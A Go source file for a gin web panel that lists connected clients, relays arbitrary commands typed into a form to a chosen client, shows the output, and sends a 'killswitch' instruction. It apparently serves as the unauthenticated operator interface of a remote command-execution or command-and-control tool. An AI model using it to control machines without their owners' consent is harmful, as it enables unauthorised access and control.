package cmd

import (
	"embed"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
)

var (
	WebPort string = "8080"
)

//go:embed templates/*
var templatesFolder embed.FS

func WebServer() {
	p := viper.GetString("Server.WebPort")
	if p != "" {
		WebPort = p
	}
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	LoadHTMLFromEmbedFS(r, templatesFolder, "templates/*.html")
	r.StaticFileFS("/style.css", "./templates/style.css", http.FS(templatesFolder))
	r.StaticFileFS("/htmx.js", "./templates/htmx.js", http.FS(templatesFolder))
	r.GET("/", getRoot)
	r.GET("/command/:clientid", getCommands)
	r.POST("/command/:clientid", execCMD)
	r.POST("/kill/:clientid", sendKillswitch)
	r.Run(":" + WebPort)
}

func getRoot(c *gin.Context) {
	c.HTML(http.StatusOK, "templates/index.html", gin.H{
		"Clients": clientList,
	})
}

func getCommands(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	client, err := returnClient(intClientID)
	if err != nil {
		c.String(http.StatusNotFound, "Client not found")
		return
	}
	c.HTML(http.StatusOK, "templates/command.html", gin.H{
		"Client": client,
	})
}

func sendKillswitch(c *gin.Context) {
	clientID := c.Param("clientid")
	intClientID, err := strconv.Atoi(clientID)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
		return
	}
	inst := Instructions{
		IsKillswitch: true,
	}
	clientList[intClientID].Instruct(inst)
	clientList[intClientID].IsOnline = false
}

func execCMD(c *gin.Context) {
	id := c.Param("clientid")
	idInt, err := strconv.Atoi(id)
	if err != nil {
		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
		return
	}
	command, _ := c.GetPostForm("cmd")

	out, err := sendCommand(idInt, command)
	if err != nil {
		e := fmt.Sprintf("Error happened executing command: %v\n", err)
		c.String(http.StatusOK, e)
		return
	}
	prettyOut := strings.Replace(out, "\n", "<br>", -1)
	c.String(http.StatusOK, "$ "+command+"<br>"+prettyOut)
}
